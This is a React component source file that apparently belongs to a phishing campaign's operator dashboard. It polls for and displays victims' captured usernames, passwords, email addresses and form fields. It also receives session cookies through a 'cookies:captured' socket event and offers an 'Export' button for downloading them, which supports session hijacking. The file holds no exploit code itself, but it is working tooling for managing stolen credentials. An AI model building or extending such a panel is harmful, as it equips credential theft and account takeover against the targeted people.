import React, { useState, useEffect } from 'react';
import { fetchLoginAttempts, downloadCookies } from '../../services/apiService';
import socketService from '../../services/socketService';
import config from '../../config/apiConfig';

const LoginAttemptsList = ({ campaignId }) => {
  const [loginAttempts, setLoginAttempts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [expandedIds, setExpandedIds] = useState({});

  const { addEventListener } = socketService;

  // Fetch login attempts every 10 seconds
  useEffect(() => {
    if (!campaignId) return;

    let isMounted = true;
    const fetchData = async () => {
      try {
        setLoading(true);
        const response = await fetchLoginAttempts(campaignId);
        if (!isMounted) return;
        setLoginAttempts(response.loginAttempts || []);
        setError(null);
      } catch (err) {
        console.error('Error fetching login attempts:', err);
        if (!isMounted) return;
        setError(err.response?.data?.message || 'Failed to load login attempts');
      } finally {
        if (isMounted) setLoading(false);
      }
    };

    fetchData();
    const interval = setInterval(fetchData, 10000);
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [campaignId]);

  // Listen for cookies:captured and patch state
  useEffect(() => {
    const handleCookies = (data) => {
      console.log('► handleCookies payload:', data);

      // Determine which field your backend emitted
      const attemptId = data.attemptId ?? data.id ?? data.attempt_id;
      const cookies = Array.isArray(data.cookies) ? data.cookies : [];

      setLoginAttempts(prev =>
        prev.map(attempt =>
          attempt.id === attemptId
            ? {
                ...attempt,
                hasCookies: true,
                cookies,
                cookiesCount: cookies.length
              }
            : attempt
        )
      );
    };

    const unsubscribe = addEventListener('cookies:captured', handleCookies);
    return () => unsubscribe();
  }, [addEventListener]);

  const formatDate = timestamp => new Date(timestamp).toLocaleString();

  const handleDownloadCookies = attemptId => {
    try {
      downloadCookies(attemptId);
    } catch (err) {
      console.error('Error downloading cookies:', err);
      alert('Failed to download cookies. Please try again.');
    }
  };

  const toggleExpand = id =>
    setExpandedIds(prev => ({ ...prev, [id]: !prev[id] }));

  // — Rendering states —
  if (loading && !loginAttempts.length) {
    return (
      <div className="glass-card p-8 text-center">
        <h2 className="text-xl font-semibold text-cyber-primary mb-4">Authentication Events</h2>
        <div className="loading-spinner mx-auto mb-4"></div>
        <p className="text-cyber-muted">Scanning for authentication attempts...</p>
      </div>
    );
  }

  if (error) {
    return (
      <div className="glass-card p-8 text-center">
        <h2 className="text-xl font-semibold text-cyber-primary mb-4">Authentication Events</h2>
        <div className="flex items-center justify-center space-x-2 text-cyber-accent">
          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z" />
          </svg>
          <span>{error}</span>
        </div>
      </div>
    );
  }

  if (!loginAttempts.length) {
    return (
      <div className="glass-card p-8 text-center">
        <h2 className="text-xl font-semibold text-cyber-primary mb-4">Authentication Events</h2>
        <svg className="w-12 h-12 text-cyber-muted mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
        </svg>
        <p className="text-cyber-muted">No authentication attempts recorded for this campaign.</p>
      </div>
    );
  }

  // — Main list —
  return (
    <div className="glass-card p-6">
      <div className="flex items-center justify-between mb-6">
        <h2 className="text-xl font-semibold text-cyber-primary">
          Authentication Events
        </h2>
        <div className="badge badge-success">
          {loginAttempts.length} attempts
        </div>
      </div>

      <div className="space-y-4">
        {loginAttempts.map(attempt => (
          <div key={attempt.id} className="data-table rounded-lg p-6">
            {/* Header */}
            <div className="flex justify-between items-start mb-4">
              <div>
                <h3 className="font-semibold text-cyber-primary text-lg">{attempt.targetEmail}</h3>
                <div className="flex items-center space-x-2 text-sm text-cyber-muted mt-1">
                  <div className="w-2 h-2 bg-cyber-accent rounded-full status-indicator"></div>
                  <span>{formatDate(attempt.timestamp)}</span>
                </div>
              </div>
              <div className="flex items-center space-x-2">
                <div className="badge badge-warning">IP: {attempt.ipAddress || 'Unknown'}</div>
                {attempt.hasCookies && (
                  <div className="badge badge-success">Cookies Captured</div>
                )}
              </div>
            </div>

            <div className="grid md:grid-cols-2 gap-6">
              {/* Credentials/Form Fields */}
              <div className="glass-card p-4">
                <h4 className="font-semibold text-sm text-cyber-secondary mb-3">Captured Credentials</h4>
                <div className="space-y-2">
                  {attempt.username || attempt.password || attempt.inputEmail ? (
                    <>
                      {attempt.username && (
                        <div className="flex justify-between">
                          <span className="text-cyber-muted">Username:</span>
                          <span className="font-mono text-cyber-primary">{attempt.username}</span>
                        </div>
                      )}
                      {attempt.password && (
                        <div className="flex justify-between">
                          <span className="text-cyber-muted">Password:</span>
                          <span className="font-mono text-cyber-accent">{'*'.repeat(attempt.password.length)}</span>
                        </div>
                      )}
                      {attempt.inputEmail && (
                        <div className="flex justify-between">
                          <span className="text-cyber-muted">Email:</span>
                          <span className="font-mono text-cyber-secondary">{attempt.inputEmail}</span>
                        </div>
                      )}
                    </>
                  ) : (
                    <p className="text-cyber-muted italic">No credentials captured</p>
                  )}
                </div>

                {attempt.formFields?.length > 0 && (
                  <div className="mt-4">
                    <button
                      onClick={() => toggleExpand(`form-${attempt.id}`)}
                      className="glass-button px-3 py-1 text-xs rounded"
                    >
                      {expandedIds[`form-${attempt.id}`] ? 'Hide' : 'Show'} All Form Fields
                    </button>
                    {expandedIds[`form-${attempt.id}`] && (
                      <div className="mt-3 data-table rounded p-3 max-h-60 overflow-auto">
                        <table className="w-full text-sm">
                          <thead>
                            <tr>
                              <th className="text-left text-cyber-primary">Field</th>
                              <th className="text-left text-cyber-primary">Value</th>
                            </tr>
                          </thead>
                          <tbody>
                            {attempt.formFields.map((f, i) => (
                              <tr key={i}>
                                <td className="text-cyber-muted">{f.name}</td>
                                <td className="font-mono text-cyber-secondary">
                                  {typeof f.value === 'object' ? JSON.stringify(f.value) : f.value}
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* Cookies Panel */}
              <div className="glass-card p-4">
                <h4 className="font-semibold text-sm text-cyber-secondary mb-3">Session Cookies</h4>
                {attempt.hasCookies ? (
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-cyber-muted">{attempt.cookiesCount} cookies captured</span>
                      <div className="badge badge-success">Active Session</div>
                    </div>
                    <div className="flex space-x-2">
                      <button
                        onClick={() => handleDownloadCookies(attempt.id)}
                        className="glass-button px-3 py-1 text-sm rounded flex items-center space-x-1"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                        </svg>
                        <span>Export</span>
                      </button>
                      <button
                        onClick={() => toggleExpand(`cookies-${attempt.id}`)}
                        className="glass-button px-3 py-1 text-sm rounded"
                      >
                        {expandedIds[`cookies-${attempt.id}`] ? 'Hide' : 'View'} Details
                      </button>
                    </div>
                    {expandedIds[`cookies-${attempt.id}`] && (
                      <div className="data-table rounded p-3 max-h-60 overflow-auto">
                        <table className="w-full text-xs">
                          <thead>
                            <tr>
                              <th className="text-left text-cyber-primary">Name</th>
                              <th className="text-left text-cyber-primary">Value</th>
                              <th className="text-left text-cyber-primary">Domain</th>
                              <th className="text-left text-cyber-primary">Flags</th>
                            </tr>
                          </thead>
                          <tbody>
                            {attempt.cookies.map((c, i) => (
                              <tr key={i}>
                                <td className="font-mono text-cyber-secondary">{c.name}</td>
                                <td className="font-mono text-cyber-muted break-all">
                                  {c.value.length > 20 ? `${c.value.substring(0, 20)}...` : c.value}
                                </td>
                                <td className="text-cyber-muted">{c.domain || '—'}</td>
                                <td className="text-cyber-muted">
                                  {[
                                    c.httpOnly && 'HttpOnly',
                                    c.secure && 'Secure',
                                    c.session && 'Session'
                                  ].filter(Boolean).join(', ') || '—'}
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    )}
                  </div>
                ) : (
                  <p className="text-cyber-muted italic">No cookies captured</p>
                )}
              </div>
            </div>

            {/* Additional Info */}
            <div className="mt-4 pt-4 border-t border-cyber-primary/20">
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                <div>
                  <span className="text-cyber-muted">Target:</span>
                  <div className="font-mono text-cyber-primary">{attempt.targetEmail}</div>
                </div>
                <div>
                  <span className="text-cyber-muted">URL:</span>
                  <div className="font-mono text-cyber-secondary break-all">{attempt.url}</div>
                </div>
                <div>
                  <span className="text-cyber-muted">Method:</span>
                  <div className="text-cyber-primary">{attempt.captureMethod || 'Web Form'}</div>
                </div>
                <div>
                  <span className="text-cyber-muted">User Agent:</span>
                  <div className="text-cyber-muted text-xs break-all">
                    {attempt.userAgent ? attempt.userAgent.substring(0, 50) + '...' : 'N/A'}
                  </div>
                </div>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default LoginAttemptsList;
